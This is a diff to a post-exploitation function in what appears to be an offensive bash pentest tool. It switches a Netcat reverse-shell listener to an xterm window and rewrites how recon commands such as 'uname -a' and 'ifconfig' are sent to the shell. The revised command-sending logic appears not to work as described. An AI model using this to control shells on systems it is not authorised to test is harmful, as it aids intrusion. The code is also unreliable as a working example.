@@ -1865,11 +1865,8 @@ post_exploitation() {
     read -p "Enter the port to listen on: " listen_port
     echo -e "${BLUE}Setting up Netcat listener on port $listen_port...${NC}"
 
-    # Run Netcat listener in the background using a different method
-    (nc -lvnp $listen_port > /tmp/nc_output.txt 2>&1 & echo $! > /tmp/nc_pid.txt) &
-    
-    # Wait for the reverse shell connection to be established
-    sleep 5
+    # Open a new terminal for the Netcat listener
+    xterm -hold -e "nc -lvnp $listen_port" &
 
     echo -e "${GREEN}[+] Reverse shell obtained. Select a post-exploitation option:${NC}"
     while true; do
@@ -1879,28 +1876,19 @@ post_exploitation() {
         read -p "Select an option: " post_option
 
         case $post_option in
-            1) send_command "uname -a && lsb_release -a" ;;
-            2) send_command "ifconfig || ip a" ;;
+            1) execute_command "uname -a && lsb_release -a" ;;
+            2) execute_command "ifconfig || ip a" ;;
             3) break ;;
             *) echo -e "${RED}Invalid option. Please try again.${NC}" ;;
         esac
-
-        # Display the output from the reverse shell
-        cat /tmp/nc_output.txt
     done
-
-    # Kill Netcat listener after post-exploitation tasks are done
-    kill $(cat /tmp/nc_pid.txt)
 }
 
-# Function to send command to the reverse shell
-send_command() {
+# Function to execute command in the reverse shell
+execute_command() {
     local cmd="$1"
-    echo "$cmd" > /tmp/nc_command.txt
-    # Read the command from the file and send it to the reverse shell
-    cat /tmp/nc_command.txt > /dev/tcp/localhost/$listen_port
-    sleep 2  # Allow some time for the command to be processed
-    rm /tmp/nc_command.txt  # Clean up the command file
+    echo -e "${BLUE}[+] Executing: $cmd${NC}"
+    xterm -hold -e "echo '$cmd' | nc localhost $listen_port" &
 }
 
 check_install_dependencies() {
